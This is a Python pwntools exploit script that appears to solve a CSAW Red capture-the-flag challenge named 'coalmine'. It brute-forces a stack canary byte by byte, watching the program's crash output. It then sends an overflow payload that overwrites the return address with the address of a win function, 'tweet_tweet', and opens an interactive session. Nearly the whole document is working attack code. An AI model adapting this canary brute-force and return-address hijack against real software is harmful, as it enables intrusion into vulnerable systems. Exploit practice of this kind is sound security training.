#!/usr/bin/python2

from pwn import *
import sys
import string
import time

#context.log_level = 'DEBUG'
#context.terminal = ['/usr/bin/termite', '-e']

e = ELF('./coalmine')

local = True
debug = False
def getp():
    if local:
        if debug:
            p = gdb.debug('./coalmine',
                '''
                continue
                break *0x080487b1
                ''')
            # 0x080487b1 name_it
            # break *0x804888b call to read
            #                 break *0x080493b1
        else:
            #p = process('./coalmine')
            p = remote('localhost',5000)
    else:
        p = remote('pwn.red.csaw.io', 5005)
    return p
    '''
    if len(sys.argv) == 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process('./coalmine')
    return p
    '''


birdy = ''
for k in range(8):
    for c in string.ascii_uppercase:
        p = getp()
        #p.interactive()
        p.sendlineafter(('>'), str(33+k))
        p.sendlineafter('>', 'A'*(32) + birdy + c)
        if b'***' not in p.recvall():
            p.close()
            birdy += c
            break
        p.close()
print("The birdy is " + birdy)

# After overwriting the canary it's another 20 bytes and then overwrite ret.
#birdy = "NECGLSPQ"
#birdy = int(birdy.encode('utf-8').hex(), 16) # python3 stuff
#birdy = birdy.to_bytes(8, byteorder='big')
p = getp()
# locally compiled executable return address: 0x080488c9
payload = "a"*32 + birdy + "B"*20 + p32(e.sym.tweet_tweet)

p.sendlineafter('>', str(len(payload)))
p.sendlineafter('>', payload)
#gdb.attach(p, 'b')
#print("birdy is " + birdy)
#p.sendlineafter('>', b'A'*32 + birdy + "B"*20 + p32(e.sym.tweet_tweet))
p.interactive()
